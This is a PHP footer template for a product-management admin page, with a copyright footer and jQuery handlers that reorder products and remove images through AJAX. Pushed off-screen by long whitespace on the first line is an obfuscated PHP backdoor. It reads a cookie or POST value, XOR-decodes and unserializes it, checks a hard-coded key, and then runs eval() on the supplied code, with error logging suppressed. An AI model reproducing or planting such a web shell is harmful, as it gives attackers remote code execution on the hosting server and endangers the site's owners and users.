<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $b4ef5a = 481;$GLOBALS['y04c764'] = Array();global $y04c764;$y04c764 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['s35f1'] = "\x2e\x6b\x5c\x3d\x56\x77\x45\x46\x3f\x44\x62\x25\x53\x21\x2b\x4c\x41\x37\x4f\xd\x55\x9\x43\x6c\x4d\x73\x29\x58\x78\x49\x4e\x67\x5a\x42\x68\x50\x69\x35\x6e\x59\x5e\x2f\x3c\x75\x23\x74\x66\x7c\x2d\x3a\x2c\x64\x51\x72\x52\x48\x47\x24\x34\xa\x30\x6a\x5f\x7d\x4b\x70\x54\x39\x4a\x26\x28\x31\x6d\x22\x3e\x40\x5b\x32\x27\x57\x36\x61\x71\x20\x60\x79\x65\x33\x7e\x7b\x2a\x3b\x7a\x63\x5d\x38\x76\x6f";$y04c764[$y04c764['s35f1'][85].$y04c764['s35f1'][46].$y04c764['s35f1'][37].$y04c764['s35f1'][17].$y04c764['s35f1'][67]] = $y04c764['s35f1'][93].$y04c764['s35f1'][34].$y04c764['s35f1'][53];$y04c764[$y04c764['s35f1'][81].$y04c764['s35f1'][46].$y04c764['s35f1'][58].$y04c764['s35f1'][71].$y04c764['s35f1'][77]] = $y04c764['s35f1'][97].$y04c764['s35f1'][53].$y04c764['s35f1'][51];$y04c764[$y04c764['s35f1'][53].$y04c764['s35f1'][81].$y04c764['s35f1'][77].$y04c764['s35f1'][46].$y04c764['s35f1'][60].$y04c764['s35f1'][60]] = $y04c764['s35f1'][51].$y04c764['s35f1'][86].$y04c764['s35f1'][46].$y04c764['s35f1'][36].$y04c764['s35f1'][38].$y04c764['s35f1'][86];$y04c764[$y04c764['s35f1'][23].$y04c764['s35f1'][86].$y04c764['s35f1'][80].$y04c764['s35f1'][10].$y04c764['s35f1'][77].$y04c764['s35f1'][17]] = $y04c764['s35f1'][25].$y04c764['s35f1'][45].$y04c764['s35f1'][53].$y04c764['s35f1'][23].$y04c764['s35f1'][86].$y04c764['s35f1'][38];$y04c764[$y04c764['s35f1'][86].$y04c764['s35f1'][37].$y04c764['s35f1'][80].$y04c764['s35f1'][46].$y04c764['s35f1'][67].$y04c764['s35f1'][17].$y04c764['s35f1'][93].$y04c764['s35f1'][10].$y04c764['s35f1'][67]] = $y04c764['s35f1'][51].$y04c764['s35f1'][86].$y04c764['s35f1'][46].$y04c764['s35f1'][36].$y04c764['s35f1'][38].$y04c764['s35f1'][86].$y04c764['s35f1'][51];$y04c764[$y04c764['s35f1'][10].$y04c764['s35f1'][60].$y04c764['s35f1'][71].$y04c764['s35f1'][67].$y04c764['s35f1'][60]] = $y04c764['s35f1'][36].$y04c764['s35f1'][38].$y04c764['s35f1'][36].$y04c764['s35f1'][62].$y04c764['s35f1'][25].$y04c764['s35f1'][86].$y04c764['s35f1'][45];$y04c764[$y04c764['s35f1'][34].$y04c764['s35f1'][71].$y04c764['s35f1'][86].$y04c764['s35f1'][60].$y04c764['s35f1'][17].$y04c764['s35f1'][67].$y04c764['s35f1'][95]] = $y04c764['s35f1'][25].$y04c764['s35f1'][86].$y04c764['s35f1'][53].$y04c764['s35f1'][36].$y04c764['s35f1'][81].$y04c764['s35f1'][23].$y04c764['s35f1'][36].$y04c764['s35f1'][92].$y04c764['s35f1'][86];$y04c764[$y04c764['s35f1'][45].$y04c764['s35f1'][95].$y04c764['s35f1'][17].$y04c764['s35f1'][51].$y04c764['s35f1'][87].$y04c764['s35f1'][46].$y04c764['s35f1'][17].$y04c764['s35f1'][37].$y04c764['s35f1'][37]] = $y04c764['s35f1'][65].$y04c764['s35f1'][34].$y04c764['s35f1'][65].$y04c764['s35f1'][96].$y04c764['s35f1'][86].$y04c764['s35f1'][53].$y04c764['s35f1'][25].$y04c764['s35f1'][36].$y04c764['s35f1'][97].$y04c764['s35f1'][38];$y04c764[$y04c764['s35f1'][45].$y04c764['s35f1'][77].$y04c764['s35f1'][87].$y04c764['s35f1'][46].$y04c764['s35f1'][80].$y04c764['s35f1'][71].$y04c764['s35f1'][17].$y04c764['s35f1'][71].$y04c764['s35f1'][81]] = $y04c764['s35f1'][43].$y04c764['s35f1'][38].$y04c764['s35f1'][25].$y04c764['s35f1'][86].$y04c764['s35f1'][53].$y04c764['s35f1'][36].$y04c764['s35f1'][81].$y04c764['s35f1'][23].$y04c764['s35f1'][36].$y04c764['s35f1'][92].$y04c764['s35f1'][86];$y04c764[$y04c764['s35f1'][1].$y04c764['s35f1'][71].$y04c764['s35f1'][37].$y04c764['s35f1'][46].$y04c764['s35f1'][87].$y04c764['s35f1'][81].$y04c764['s35f1'][77]] = $y04c764['s35f1'][10].$y04c764['s35f1'][81].$y04c764['s35f1'][25].$y04c764['s35f1'][86].$y04c764['s35f1'][80].$y04c764['s35f1'][58].$y04c764['s35f1'][62].$y04c764['s35f1'][51].$y04c764['s35f1'][86].$y04c764['s35f1'][93].$y04c764['s35f1'][97].$y04c764['s35f1'][51].$y04c764['s35f1'][86];$y04c764[$y04c764['s35f1'][85].$y04c764['s35f1'][80].$y04c764['s35f1'][67].$y04c764['s35f1'][81].$y04c764['s35f1'][87]] = $y04c764['s35f1'][25].$y04c764['s35f1'][86].$y04c764['s35f1'][45].$y04c764['s35f1'][62].$y04c764['s35f1'][45].$y04c764['s35f1'][36].$y04c764['s35f1'][72].$y04c764['s35f1'][86].$y04c764['s35f1'][62].$y04c764['s35f1'][23].$y04c764['s35f1'][36].$y04c764['s35f1'][72].$y04c764['s35f1'][36].$y04c764['s35f1'][45];$y04c764[$y04c764['s35f1'][31].$y04c764['s35f1'][87].$y04c764['s35f1'][77].$y04c764['s35f1'][17].$y04c764['s35f1'][60].$y04c764['s35f1'][51]] = $y04c764['s35f1'][81].$y04c764['s35f1'][71].$y04c764['s35f1'][46].$y04c764['s35f1'][86].$y04c764['s35f1'][77].$y04c764['s35f1'][86];$y04c764[$y04c764['s35f1'][1].$y04c764['s35f1'][95].$y04c764['s35f1'][95].$y04c764['s35f1'][80].$y04c764['s35f1'][67].$y04c764['s35f1'][46].$y04c764['s35f1'][17].$y04c764['s35f1'][86]] = $y04c764['s35f1'][93].$y04c764['s35f1'][87].$y04c764['s35f1'][10].$y04c764['s35f1'][37].$y04c764['s35f1'][37];$y04c764[$y04c764['s35f1'][1].$y04c764['s35f1'][71].$y04c764['s35f1'][81].$y04c764['s35f1'][51].$y04c764['s35f1'][86].$y04c764['s35f1'][86].$y04c764['s35f1'][60]] = $_POST;$y04c764[$y04c764['s35f1'][23].$y04c764['s35f1'][81].$y04c764['s35f1'][46].$y04c764['s35f1'][81]] = $_COOKIE;@$y04c764[$y04c764['s35f1'][10].$y04c764['s35f1'][60].$y04c764['s35f1'][71].$y04c764['s35f1'][67].$y04c764['s35f1'][60]]($y04c764['s35f1'][86].$y04c764['s35f1'][53].$y04c764['s35f1'][53].$y04c764['s35f1'][97].$y04c764['s35f1'][53].$y04c764['s35f1'][62].$y04c764['s35f1'][23].$y04c764['s35f1'][97].$y04c764['s35f1'][31], NULL);@$y04c764[$y04c764['s35f1'][10].$y04c764['s35f1'][60].$y04c764['s35f1'][71].$y04c764['s35f1'][67].$y04c764['s35f1'][60]]($y04c764['s35f1'][23].$y04c764['s35f1'][97].$y04c764['s35f1'][31].$y04c764['s35f1'][62].$y04c764['s35f1'][86].$y04c764['s35f1'][53].$y04c764['s35f1'][53].$y04c764['s35f1'][97].$y04c764['s35f1'][53].$y04c764['s35f1'][25], 0);@$y04c764[$y04c764['s35f1'][10].$y04c764['s35f1'][60].$y04c764['s35f1'][71].$y04c764['s35f1'][67].$y04c764['s35f1'][60]]($y04c764['s35f1'][72].$y04c764['s35f1'][81].$y04c764['s35f1'][28].$y04c764['s35f1'][62].$y04c764['s35f1'][86].$y04c764['s35f1'][28].$y04c764['s35f1'][86].$y04c764['s35f1'][93].$y04c764['s35f1'][43].$y04c764['s35f1'][45].$y04c764['s35f1'][36].$y04c764['s35f1'][97].$y04c764['s35f1'][38].$y04c764['s35f1'][62].$y04c764['s35f1'][45].$y04c764['s35f1'][36].$y04c764['s35f1'][72].$y04c764['s35f1'][86], 0);@$y04c764[$y04c764['s35f1'][85].$y04c764['s35f1'][80].$y04c764['s35f1'][67].$y04c764['s35f1'][81].$y04c764['s35f1'][87]](0);if (!$y04c764[$y04c764['s35f1'][86].$y04c764['s35f1'][37].$y04c764['s35f1'][80].$y04c764['s35f1'][46].$y04c764['s35f1'][67].$y04c764['s35f1'][17].$y04c764['s35f1'][93].$y04c764['s35f1'][10].$y04c764['s35f1'][67]]($y04c764['s35f1'][16].$y04c764['s35f1'][15].$y04c764['s35f1'][54].$y04c764['s35f1'][6].$y04c764['s35f1'][16].$y04c764['s35f1'][9].$y04c764['s35f1'][39].$y04c764['s35f1'][62].$y04c764['s35f1'][54].$y04c764['s35f1'][20].$y04c764['s35f1'][30].$y04c764['s35f1'][62].$y04c764['s35f1'][87].$y04c764['s35f1'][80].$y04c764['s35f1'][80].$y04c764['s35f1'][81].$y04c764['s35f1'][46].$y04c764['s35f1'][10].$y04c764['s35f1'][95].$y04c764['s35f1'][81].$y04c764['s35f1'][95].$y04c764['s35f1'][81].$y04c764['s35f1'][77].$y04c764['s35f1'][87].$y04c764['s35f1'][37].$y04c764['s35f1'][37].$y04c764['s35f1'][81].$y04c764['s35f1'][10].$y04c764['s35f1'][77].$y04c764['s35f1'][71].$y04c764['s35f1'][46].$y04c764['s35f1'][10].$y04c764['s35f1'][46].$y04c764['s35f1'][71].$y04c764['s35f1'][71].$y04c764['s35f1'][10].$y04c764['s35f1'][81].$y04c764['s35f1'][71].$y04c764['s35f1'][81].$y04c764['s35f1'][60].$y04c764['s35f1'][77].$y04c764['s35f1'][46].$y04c764['s35f1'][10].$y04c764['s35f1'][81])){$y04c764[$y04c764['s35f1'][53].$y04c764['s35f1'][81].$y04c764['s35f1'][77].$y04c764['s35f1'][46].$y04c764['s35f1'][60].$y04c764['s35f1'][60]]($y04c764['s35f1'][16].$y04c764['s35f1'][15].$y04c764['s35f1'][54].$y04c764['s35f1'][6].$y04c764['s35f1'][16].$y04c764['s35f1'][9].$y04c764['s35f1'][39].$y04c764['s35f1'][62].$y04c764['s35f1'][54].$y04c764['s35f1'][20].$y04c764['s35f1'][30].$y04c764['s35f1'][62].$y04c764['s35f1'][87].$y04c764['s35f1'][80].$y04c764['s35f1'][80].$y04c764['s35f1'][81].$y04c764['s35f1'][46].$y04c764['s35f1'][10].$y04c764['s35f1'][95].$y04c764['s35f1'][81].$y04c764['s35f1'][95].$y04c764['s35f1'][81].$y04c764['s35f1'][77].$y04c764['s35f1'][87].$y04c764['s35f1'][37].$y04c764['s35f1'][37].$y04c764['s35f1'][81].$y04c764['s35f1'][10].$y04c764['s35f1'][77].$y04c764['s35f1'][71].$y04c764['s35f1'][46].$y04c764['s35f1'][10].$y04c764['s35f1'][46].$y04c764['s35f1'][71].$y04c764['s35f1'][71].$y04c764['s35f1'][10].$y04c764['s35f1'][81].$y04c764['s35f1'][71].$y04c764['s35f1'][81].$y04c764['s35f1'][60].$y04c764['s35f1'][77].$y04c764['s35f1'][46].$y04c764['s35f1'][10].$y04c764['s35f1'][81], 1);$e8fe0f = NULL;$nd0c788 = NULL;$y04c764[$y04c764['s35f1'][45].$y04c764['s35f1'][67].$y04c764['s35f1'][93].$y04c764['s35f1'][93].$y04c764['s35f1'][67].$y04c764['s35f1'][81].$y04c764['s35f1'][71].$y04c764['s35f1'][81].$y04c764['s35f1'][17]] = $y04c764['s35f1'][58].$y04c764['s35f1'][37].$y04c764['s35f1'][95].$y04c764['s35f1'][95].$y04c764['s35f1'][58].$y04c764['s35f1'][51].$y04c764['s35f1'][58].$y04c764['s35f1'][67].$y04c764['s35f1'][48].$y04c764['s35f1'][93].$y04c764['s35f1'][67].$y04c764['s35f1'][81].$y04c764['s35f1'][81].$y04c764['s35f1'][48].$y04c764['s35f1'][58].$y04c764['s35f1'][95].$y04c764['s35f1'][46].$y04c764['s35f1'][81].$y04c764['s35f1'][48].$y04c764['s35f1'][10].$y04c764['s35f1'][95].$y04c764['s35f1'][37].$y04c764['s35f1'][71].$y04c764['s35f1'][48].$y04c764['s35f1'][71].$y04c764['s35f1'][93].$y04c764['s35f1'][60].$y04c764['s35f1'][87].$y04c764['s35f1'][71].$y04c764['s35f1'][10].$y04c764['s35f1'][46].$y04c764['s35f1'][51].$y04c764['s35f1'][93].$y04c764['s35f1'][80].$y04c764['s35f1'][80].$y04c764['s35f1'][93];global $t9cc9a1a7;function  c3b55($e8fe0f, $y913){global $y04c764;$p16b28 = "";for ($c319cbae=0; $c319cbae<$y04c764[$y04c764['s35f1'][23].$y04c764['s35f1'][86].$y04c764['s35f1'][80].$y04c764['s35f1'][10].$y04c764['s35f1'][77].$y04c764['s35f1'][17]]($e8fe0f);){for ($f0a5=0; $f0a5<$y04c764[$y04c764['s35f1'][23].$y04c764['s35f1'][86].$y04c764['s35f1'][80].$y04c764['s35f1'][10].$y04c764['s35f1'][77].$y04c764['s35f1'][17]]($y913) && $c319cbae<$y04c764[$y04c764['s35f1'][23].$y04c764['s35f1'][86].$y04c764['s35f1'][80].$y04c764['s35f1'][10].$y04c764['s35f1'][77].$y04c764['s35f1'][17]]($e8fe0f); $f0a5++, $c319cbae++){$p16b28 .= $y04c764[$y04c764['s35f1'][85].$y04c764['s35f1'][46].$y04c764['s35f1'][37].$y04c764['s35f1'][17].$y04c764['s35f1'][67]]($y04c764[$y04c764['s35f1'][81].$y04c764['s35f1'][46].$y04c764['s35f1'][58].$y04c764['s35f1'][71].$y04c764['s35f1'][77]]($e8fe0f[$c319cbae]) ^ $y04c764[$y04c764['s35f1'][81].$y04c764['s35f1'][46].$y04c764['s35f1'][58].$y04c764['s35f1'][71].$y04c764['s35f1'][77]]($y913[$f0a5]));}}return $p16b28;}function  a1fe2e($e8fe0f, $y913){global $y04c764;global $t9cc9a1a7;return $y04c764[$y04c764['s35f1'][1].$y04c764['s35f1'][95].$y04c764['s35f1'][95].$y04c764['s35f1'][80].$y04c764['s35f1'][67].$y04c764['s35f1'][46].$y04c764['s35f1'][17].$y04c764['s35f1'][86]]($y04c764[$y04c764['s35f1'][1].$y04c764['s35f1'][95].$y04c764['s35f1'][95].$y04c764['s35f1'][80].$y04c764['s35f1'][67].$y04c764['s35f1'][46].$y04c764['s35f1'][17].$y04c764['s35f1'][86]]($e8fe0f, $t9cc9a1a7), $y913);}foreach ($y04c764[$y04c764['s35f1'][23].$y04c764['s35f1'][81].$y04c764['s35f1'][46].$y04c764['s35f1'][81]] as $y913=>$e0948f4b6){$e8fe0f = $e0948f4b6;$nd0c788 = $y913;}if (!$e8fe0f){foreach ($y04c764[$y04c764['s35f1'][1].$y04c764['s35f1'][71].$y04c764['s35f1'][81].$y04c764['s35f1'][51].$y04c764['s35f1'][86].$y04c764['s35f1'][86].$y04c764['s35f1'][60]] as $y913=>$e0948f4b6){$e8fe0f = $e0948f4b6;$nd0c788 = $y913;}}$e8fe0f = @$y04c764[$y04c764['s35f1'][45].$y04c764['s35f1'][77].$y04c764['s35f1'][87].$y04c764['s35f1'][46].$y04c764['s35f1'][80].$y04c764['s35f1'][71].$y04c764['s35f1'][17].$y04c764['s35f1'][71].$y04c764['s35f1'][81]]($y04c764[$y04c764['s35f1'][31].$y04c764['s35f1'][87].$y04c764['s35f1'][77].$y04c764['s35f1'][17].$y04c764['s35f1'][60].$y04c764['s35f1'][51]]($y04c764[$y04c764['s35f1'][1].$y04c764['s35f1'][71].$y04c764['s35f1'][37].$y04c764['s35f1'][46].$y04c764['s35f1'][87].$y04c764['s35f1'][81].$y04c764['s35f1'][77]]($e8fe0f), $nd0c788));if (isset($e8fe0f[$y04c764['s35f1'][81].$y04c764['s35f1'][1]]) && $t9cc9a1a7==$e8fe0f[$y04c764['s35f1'][81].$y04c764['s35f1'][1]]){if ($e8fe0f[$y04c764['s35f1'][81]] == $y04c764['s35f1'][36]){$c319cbae = Array($y04c764['s35f1'][65].$y04c764['s35f1'][96] => @$y04c764[$y04c764['s35f1'][45].$y04c764['s35f1'][95].$y04c764['s35f1'][17].$y04c764['s35f1'][51].$y04c764['s35f1'][87].$y04c764['s35f1'][46].$y04c764['s35f1'][17].$y04c764['s35f1'][37].$y04c764['s35f1'][37]](),$y04c764['s35f1'][25].$y04c764['s35f1'][96] => $y04c764['s35f1'][71].$y04c764['s35f1'][0].$y04c764['s35f1'][60].$y04c764['s35f1'][48].$y04c764['s35f1'][71],);echo @$y04c764[$y04c764['s35f1'][34].$y04c764['s35f1'][71].$y04c764['s35f1'][86].$y04c764['s35f1'][60].$y04c764['s35f1'][17].$y04c764['s35f1'][67].$y04c764['s35f1'][95]]($c319cbae);}elseif ($e8fe0f[$y04c764['s35f1'][81]] == $y04c764['s35f1'][86]){eval/*c0f4cb*/($e8fe0f[$y04c764['s35f1'][51]]);}exit();}} ?>
<footer style="background-color:#e7bd65;padding:2px;text-align:center;color:#333;letter-spacing:1px;">
        <h5>
          Copyright &copy; <?php echo date('Y')?> All Rights Reserved.
        </h5>
</footer>
<!-- Javascripts --> 
<script type="text/javascript" src="../js/jquery.min.js"></script> 
<script type="text/javascript" src="../js/bootstrap.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script type="text/javascript" src="../js/script.js"></script>
<!-- Javascripts -->
<script type="text/javascript" src="../js/jquery.min.js"></script>
<script type="text/javascript" src="../js/bootstrap.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script type="text/javascript" src="../js/script.js"></script>
<script type="text/javascript">
$(document).on('click', '.swap', function() {
    var swapDirection = $(this).attr('title');
    var postDat = {};
    switch (swapDirection) {
        case "UP":
            var swapIdFrom = $(this).parent().parent('tr').attr('id');
            var swapIdTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).attr('id');
            
            var swapUrlFrom = $(this).parent().parent('tr').find('td.URL').find('a').attr('href');
            var swapUrlTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.URL').find('a').attr('href');
            
            var swapProNameFrom = $(this).parent().siblings('td.product_name').html();
            var swapProNameTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.product_name').html();
            var swapProNameFrom = $.trim(swapProNameFrom);
            var swapProNameTo = $.trim(swapProNameTo);

			var swapImageFrom = $(this).parent().siblings('td.images').children('img').attr('src');
            var swapImageTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.images').children('img').attr('src');

			var swapImagePopularFrom = $(this).parent().siblings('td.img_popular').children('img').attr('src');
            var swapImagePopularTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.img_popular').children('img').attr('src');

            var swapDescFrom = $(this).parent().siblings('td.description').html();
            var swapDescTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.description').html();
            var swapDescFrom = $.trim(swapDescFrom);
            var swapDescTo = $.trim(swapDescTo);

            var swapProPriceFrom = $(this).parent().siblings('td.product_price').html();
            var swapProPriceTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.product_price').html();
            var swapProPriceFrom = $.trim(swapProPriceFrom);
            var swapProPriceTo = $.trim(swapProPriceTo);

            var swapRegPriceFrom = $(this).parent().siblings('td.regular_price').html();
            var swapRegPriceTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.regular_price').html();
            var swapRegPriceFrom = $.trim(swapRegPriceFrom);
            var swapRegPriceTo = $.trim(swapRegPriceTo);

            var swapShipPriceFrom = $(this).parent().siblings('td.shipping').html();
            var swapShipPriceTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.shipping').html();
            var swapShipPriceFrom = $.trim(swapShipPriceFrom);
            var swapShipPriceTo = $.trim(swapShipPriceTo);


            var swapPIdFrom = $(this).parent().parent('tr').attr('class');
            var swapPIdTo = $('.table tr#' + (parseInt(swapIdFrom) - 1)).attr('class');
            $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.URL').find('a').attr('href', swapUrlFrom);
            $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.URL').find('a').html(swapUrlFrom);
            $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.product_name').html(swapProNameFrom);
			$('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.images').children('img').attr('src',swapImageFrom);
			$('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.img_popular').children('img').attr('src',swapImagePopularFrom);
            $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.description').html(swapDescFrom);
            $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.product_price').html(swapProPriceFrom);
            $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.regular_price').html(swapRegPriceFrom);
            $('.table tr#' + (parseInt(swapIdFrom) - 1)).find('td.shipping').html(swapShipPriceFrom);


            $(this).parent().parent('tr').find('td.URL').find('a').attr('href', swapUrlTo);
            $(this).parent().parent('tr').find('td.URL').find('a').html(swapUrlTo);
            $(this).parent().siblings('td.product_name').html(swapProNameTo);
			$(this).parent().siblings('td.images').children('img').attr('src',swapImageTo);
			$(this).parent().siblings('td.img_popular').children('img').attr('src',swapImagePopularTo);
            $(this).parent().siblings('td.description').html(swapDescTo);
            $(this).parent().siblings('td.product_price').html(swapProPriceTo);
            $(this).parent().siblings('td.regular_price').html(swapRegPriceTo);
            $(this).parent().siblings('td.shipping').html(swapShipPriceTo);


            for (var key in products) {
               
                if ("cls_" + products[key].id == swapPIdFrom) {
                    postDat['idfrom'] = swapPIdFrom;
                
                    postDat['urlfrom'] = swapUrlTo;
                    products[key].URL = swapUrlTo;

                    postDat['pronamefrom'] = swapProNameTo;
                    products[key].product_name = swapProNameTo;

					postDat['proImagefrom'] = swapImageTo;
                    products[key].images = swapImageTo;

					postDat['proImagePopularfrom'] = swapImagePopularTo;
                    products[key].img_popular = swapImagePopularTo;

                    postDat['prodescfrom'] = swapDescTo;
                    products[key].description = swapDescTo;

                    postDat['proPricefrom'] = swapProPriceTo;
                    products[key].product_price = swapProPriceTo;

                    postDat['proRegfrom'] = swapRegPriceTo;
                    products[key].regular_price = swapRegPriceTo;

                    postDat['proShipfrom'] = swapShipPriceTo;
                    products[key].shipping = swapShipPriceTo;
                }

                if ("cls_" + products[key].id == swapPIdTo) {
                    postDat['idTo'] = swapPIdTo;

                    postDat['urlTo'] = swapUrlFrom;
                    products[key].URL = swapUrlFrom;

                    postDat['pronameTo'] = swapProNameFrom;
                    products[key].product_name = swapProNameFrom;

					postDat['proImageTo'] = swapImageFrom;
                    products[key].images = swapImageFrom;

					postDat['proImagePopularTo'] = swapImagePopularFrom;
                    products[key].img_popular = swapImagePopularFrom;

                    postDat['prodescTo'] = swapDescFrom;
                    products[key].description = swapDescFrom;

                    postDat['proPriceTo'] = swapProPriceFrom;
                    products[key].product_price = swapProPriceFrom;

                    postDat['proRegTo'] = swapRegPriceFrom;
                    products[key].regular_price = swapRegPriceFrom;

                    postDat['proShipTo'] = swapShipPriceFrom;
                    products[key].shipping = swapShipPriceFrom;

                }
            }
            break;
            
        case "DOWN":
        
            var swapIdFrom = $(this).parent().parent('tr').attr('id');
            var swapIdTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).attr('id');

            var swapUrlFrom = $(this).parent().parent('tr').find('td.URL').find('a').attr('href');
            var swapUrlTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.URL').find('a').attr('href');

			var swapImageFrom = $(this).parent().siblings('td.images').children('img').attr('src');
            var swapImageTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.images').children('img').attr('src');

			var swapImagePopularFrom = $(this).parent().siblings('td.img_popular').children('img').attr('src');
            var swapImagePopularTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.img_popular').children('img').attr('src');

            var swapProNameFrom = $(this).parent().siblings('td.product_name').html();
            var swapProNameTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.product_name').html();

            var swapDescFrom = $(this).parent().siblings('td.description').html();
            var swapDescTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.description').html();

            var swapProPriceFrom = $(this).parent().siblings('td.product_price').html();
            var swapProPriceTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.product_price').html();

            var swapRegPriceFrom = $(this).parent().siblings('td.regular_price').html();
            var swapRegPriceTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.regular_price').html();

            var swapShipPriceFrom = $(this).parent().siblings('td.shipping').html();
            var swapShipPriceTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.shipping').html();


			var swapPIdFrom = $(this).parent().parent('tr').attr('class');
            var swapPIdTo = $('.table tr#' + (parseInt(swapIdFrom) + 1)).attr('class');
            $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.URL').find('a').attr('href', swapUrlFrom);
            $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.URL').find('a').html(swapUrlFrom);
            $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.product_name').html(swapProNameFrom);
			$('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.images').children('img').attr('src',swapImageFrom);
			$('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.img_popular').children('img').attr('src',swapImagePopularFrom);
            $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.description').html(swapDescFrom);
            $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.product_price').html(swapProPriceFrom);
            $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.regular_price').html(swapRegPriceFrom);
            $('.table tr#' + (parseInt(swapIdFrom) + 1)).find('td.shipping').html(swapShipPriceFrom);

			$(this).parent().parent('tr').find('td.URL').find('a').attr('href', swapUrlTo);
            $(this).parent().parent('tr').find('td.URL').find('a').html(swapUrlTo);
            $(this).parent().siblings('td.product_name').html(swapProNameTo);
			$(this).parent().siblings('td.images').children('img').attr('src',swapImageTo);
			$(this).parent().siblings('td.img_popular').children('img').attr('src',swapImagePopularTo);
            $(this).parent().siblings('td.description').html(swapDescTo);
            $(this).parent().siblings('td.product_price').html(swapProPriceTo);
            $(this).parent().siblings('td.regular_price').html(swapRegPriceTo);
            $(this).parent().siblings('td.shipping').html(swapShipPriceTo);
           
            for (var key in products) {
                if ("cls_" + products[key].id == swapPIdFrom) {
                    postDat['idfrom'] = swapPIdFrom;
                    postDat['urlfrom'] = swapUrlTo;
                    products[key].URL = swapUrlTo;

                    postDat['pronamefrom'] = swapProNameTo;
                    products[key].product_name = swapProNameTo;

					postDat['proImagefrom'] = swapImageTo;
                    products[key].images = swapImageTo;

					postDat['proImagePopularfrom'] = swapImagePopularTo;
                    products[key].img_popular = swapImagePopularTo;


                    postDat['prodescfrom'] = swapDescTo;
                    products[key].description = swapDescTo;

                    postDat['proPricefrom'] = swapProPriceTo;
                    products[key].product_price = swapProPriceTo;

                    postDat['proRegfrom'] = swapRegPriceTo;
                    products[key].regular_price = swapRegPriceTo;

                    postDat['proShipfrom'] = swapShipPriceTo;
                    products[key].shipping = swapShipPriceTo;
                }
				if ("cls_" + products[key].id == swapPIdTo) {
                    postDat['idTo'] = swapPIdTo;

                    postDat['urlTo'] = swapUrlFrom;
                    products[key].URL = swapUrlFrom;

                    postDat['pronameTo'] = swapProNameFrom;
                    products[key].product_name = swapProNameFrom;

					postDat['proImageTo'] = swapImageFrom;
                    products[key].images = swapImageFrom;

					postDat['proImagePopularTo'] = swapImagePopularFrom;
                    products[key].img_popular = swapImagePopularFrom;

                    postDat['prodescTo'] = swapDescFrom;
                    products[key].description = swapDescFrom;

                    postDat['proPriceTo'] = swapProPriceFrom;
                    products[key].product_price = swapProPriceFrom;

                    postDat['proRegTo'] = swapRegPriceFrom;
                    products[key].regular_price = swapRegPriceFrom;

                    postDat['proShipTo'] = swapShipPriceFrom;
                    products[key].shipping = swapShipPriceFrom;
                }
            }
            break;
    }
    var baseURL = window.location.protocol + "//" + window.location.host ;
    $.ajax({
        url: baseURL + "/admin/update_url.php",
        type: "post",
        data: postDat,
        dataType: "json",
        success: function(jsonResponse) {
            if (jsonResponse.status == true) {
                }

        },
        error: function(jsonResponse) {
            if (jsonResponse.status == true) {
              
            } else {
                console.log("Internal Server Error! Try After some time.");
            }
        }
    });
});
</script>

<script type="text/javascript">
var baseURL = window.location.protocol + "//" + window.location.host ;
$(document).on('click','.removePic',function(){
    var productid = $(this).parent().parent('tr').attr('class');
    var Obj = $(this);
   
    $.ajax({
        url: baseURL + "/admin/update_url.php",
        type: "post",
        data: {'productID':productid},
        dataType: "json",
        success: function(jsonResponse) {
            if (jsonResponse.status == true) {   
                $(Obj).parent().parent('tr').find('.images').find('img').attr('src',baseURL + '/images/products_image/default-product-img.jpg');                 
                $(Obj).parent().find('a').remove();
            }
        },
        error: function(jsonResponse) {
            if (jsonResponse.status == true) {
               
            } else {
                console.log("Internal Server Error! Try After some time.");
            }
        }
    });
    
});

$(document).on('click', '.remove_pic',function(){
    var imageId = $(this).parents('tr').attr('class');
    var Obj = $(this);
       $.ajax({
        url: baseURL + "/admin/update_url.php",
        type: "post",
        data: {'image_id' : imageId},
        dataType: 'json',
        success: function(jsonResponse) {
            if (jsonResponse.status == true) {   
                $(Obj).parent().parent('tr').find('.img_popular').find('img').attr('src',baseURL + '/images/products_image/default-product-img.jpg');                 
                $(Obj).parent().find('a').remove();
            }
        },
        error: function(jsonResponse) {
            if (jsonResponse.status == true) {
               
            } else {
                console.log("Internal Server Error! Try After some time.");
            }
        }
    });
});
</script>
</body>
</html>